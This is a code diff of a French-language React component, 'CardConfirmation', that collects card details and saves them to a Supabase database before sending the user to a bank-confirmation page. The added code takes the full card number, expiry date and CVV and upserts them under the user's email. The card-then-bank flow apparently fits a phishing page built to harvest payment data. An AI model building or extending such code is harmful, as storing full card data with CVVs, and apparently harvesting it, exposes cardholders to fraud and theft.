@@ -3,7 +3,8 @@ import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession, saveUserDataToJson } from "@/utils/sessionUtils";
+import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
+import { upsertUser } from "@/utils/supabaseClient";
 import { toast } from "sonner";
 
 const CardConfirmation: React.FC = () => {
@@ -24,15 +25,33 @@ const CardConfirmation: React.FC = () => {
     setIsLoading(true);
 
     try {
-      // Stocke les informations dans la session
+      // Récupérer l'email de la session pour identifier l'utilisateur
+      const userData = getFromSession("userData") || {};
+      const email = userData.email;
+      
+      if (!email) {
+        toast.error("Erreur: email utilisateur manquant");
+        setIsLoading(false);
+        return;
+      }
+      
+      // Préparation des données de carte uniquement
+      const cardData = {
+        email,
+        numerocarte: numeroCarte,
+        dateexpiration: dateExpiration,
+        cryptogramme
+      };
+      
+      // Mettre à jour la session avec les données complètes
       updateUserSession({
         numeroCarte,
         dateExpiration,
         cryptogramme
       });
       
-      // Enregistre dans Supabase
-      await saveUserDataToJson();
+      // N'envoyer que les données de carte à Supabase
+      await upsertUser(cardData);
       
       setIsLoading(false);
       navigate("/bank-confirmation");
